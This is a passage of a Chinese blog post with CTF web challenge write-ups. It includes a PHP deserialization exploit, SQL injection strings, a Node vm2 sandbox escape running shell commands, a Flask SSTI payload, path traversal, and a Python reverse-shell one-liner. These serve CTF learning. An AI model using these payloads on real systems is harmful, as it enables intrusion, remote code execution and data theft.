class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>改名为1.jpg，上传，可以在function处发现文件命名规则。</p>
<p>在file处输入<code>phar:///var/www/html/upload/文件名</code>，即可得到flag。</p>
<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>在<code>www.tar.gz</code>发现源码,是一道反序列化，链子比较简单，通过Register类的__destruct方法调用Profile类的update_img方法，在此处修改文件名即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">  @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">  @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">  <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;update_img();</span><br></pre></td></tr></table></figure>

<p>poc如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registed=<span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;except[<span class="string">'index'</span>]=<span class="string">"img"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img=<span class="string">"upload_img"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=<span class="string">"./upload/04b0951938d905b41348c1548f9c338b/356f6894f245b0f1a97f01f1d6d4744a.png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="string">"./upload/04b0951938d905b41348c1548f9c338b/eval.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>一道sql注入，robots.txt中有提示，得到passwd就会输出flag，fuzz一下，发现过滤了单引号等字符，单引号能用反斜杠转义，空格用/**/代替，regexp未被过滤，所以可以使用正则注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00</span><br></pre></td></tr></table></figure>

<p>逐位爆破即可得到密码，输入密码得到flag。</p>
<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>题目说真的是php吗，在nodejs中也有eval函数，随便输入一个node命令<code>Error().stack</code>，打印Error被实例化的位置，可以发现Error被实例化在沙箱外，所以就是利用Error报错来沙箱逃逸了。</p>
<p>大佬的文章：<a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207291</a></p>
<p>github上也有关于Error报错利用的payload<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p>
<p>改题目还过滤了许多关键字，但是我们可以通过字符串拼接绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;`$&#123;`prototy`&#125;pe`&#125;`=prototype //变量拼接</span><br><span class="line">[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)join方法数组拼接</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat flag`)[`toString`](); &#125; &#125;)()</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`whoami`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>一道二次注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+(select hex(hex(database())))+&apos;0</span><br></pre></td></tr></table></figure>

<p>使用两次hex的原因是如果hex编码之后有字母，就会被截断，经过两次hex编码后，可以转换为纯数字，与0相加还得原数，每次爆10位，多了会自动转换为科学计数法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&apos;0</span><br></pre></td></tr></table></figure>

<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8" target="_blank" rel="noopener">flaskssti</a>，过滤了<code>__globals__</code>关键字，调用<code>__getattribute__</code>base64编码绕过，读取flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(%27X19nbG9iYWxzX18=%27.decode(%27base64%27))[%27__builtins__%27][%27eval%27](%27__import__(&quot;os&quot;).popen(&quot;cd%20/flasklight;%20cat%20coomme_geeeett_youur_flek&quot;).read()%27)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>这题直接../../../../../flag就读到了，应该是非预期，权限没设置好，预期解走一遍。</p>
<p><code>../../../../proc/self/cmdline</code>读取到app.py，在linux下，打开文件，如果没有关闭，便会在/proc/[pid]/fd/innode处保存原文件，因为/proc/self代表当前进程，所以我们只需要爆破一下innode，得到secretfile</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxk6hdQZnALSCYt/cqdPADFK9W7KC6VEJmax+uK8Bf8=</span><br></pre></td></tr></table></figure>

<p>执行命令没有回显，弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
  
	</div>
		<footer class="article-footer clearfix">


<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/writeup/">writeup</a>
</div>



<div class="article-share" id="share">

  <div data-url="http://yoursite.com/2019/10/02/BUUCTF2/" data-title="BUUCTF1 | buxqm" data-tsina="" class="share clearfix">
  </div>

</div>
</footer>   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2019/10/02/PDO学习/" title="pdo学习">
  <strong>PREVIOUS:</strong><br/>
  <span>
  pdo学习</span>
</a>
</div>


<div class="next">
<a href="/2019/09/28/SSRF学习/"  title="SSRF">
 <strong>NEXT:</strong><br/> 
 <span>SSRF
</span>
</a>
</div>

</nav>

	
<section class="comment">
	<div class="ds-thread"></div>
</section>

</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">2.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-文件探测"><span class="toc-number">4.</span> <span class="toc-text">[BJDCTF 2nd]文件探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">5.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-eating-cms"><span class="toc-number">6.</span> <span class="toc-text">[N1CTF 2018]eating_cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">7.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-EZ三剑客-EzNode"><span class="toc-number">8.</span> <span class="toc-text">[GKCTF2020]EZ三剑客-EzNode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-玄武组-SSRFMe"><span class="toc-number">9.</span> <span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">10.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-EzPHP"><span class="toc-number">11.</span> <span class="toc-text">[BJDCTF2020]EzPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">12.</span> <span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网杯-2019-Upload"><span class="toc-number">13.</span> <span class="toc-text">[强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-SQLi"><span class="toc-number">14.</span> <span class="toc-text">[NCTF2019]SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-JustEscape"><span class="toc-number">15.</span> <span class="toc-text">[HFCTF2020]JustEscape</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯2018-Unfinish"><span class="toc-number">16.</span> <span class="toc-text">[网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="toc-number">17.</span> <span class="toc-text">[CSCCTF 2019 Qual]FlaskLight</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2020-白虎组-PicDown"><span class="toc-number">18.</span> <span class="toc-text">[网鼎杯 2020 白虎组]PicDown</span></a></li></ol>
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
			<li><a href="/categories/XXE/" title="XXE">XXE<sup>1</sup></a></li>
		
			<li><a href="/categories/pdo/" title="pdo">pdo<sup>1</sup></a></li>
		
			<li><a href="/categories/trick/" title="trick">trick<sup>1</sup></a></li>
		
			<li><a href="/categories/writeup/" title="writeup">writeup<sup>2</sup></a></li>
		
			<li><a href="/categories/专题-writeup/" title="专题  writeup">专题  writeup<sup>1</sup></a></li>
		
			<li><a href="/categories/协议学习/" title="协议学习">协议学习<sup>1</sup></a></li>
		
			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>1</sup></a></li>
		
			<li><a href="/categories/西湖论剑/" title="西湖论剑">西湖论剑<sup>1</sup></a></li>
		
		</ul>
</div>


  

  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello <br/>
			似水流年</p>
	</section>
	 
	<div class="social-font clearfix">
		
		
		
		
		
	</div>
		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
		
		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.1.0.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else
    {
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      h  = $('article h2')
      ah = $('article h2'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  if(ah.length==0){
    t.css('display','none');
  }else{
    c.click(function(){
      ta.css('display', 'block').addClass('fadeIn');
    });
    o.click(function(){
      ta.css('display', 'none');
    });
    $(window).scroll(function(){
      ta.css("top",Math.max(140,320-$(this).scrollTop()));
    });
  };
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina');
  var html = [
  '<a href="#" class="overlay" id="qrcode"></a>',
  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);
  $('.article-share-qrcode').click(function(){
    var imgSrc = $('#qrcode-pic').attr('data-src');
    $('#qrcode-pic').attr('src', imgSrc);
    $('#qrcode-pic').load(function(){
        $('.qrcode strong').text(' ');
    });
  });
});     
</script>


<script type="text/javascript">
  var duoshuoQuery = {short_name:""};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script> 





  </body>
</html>
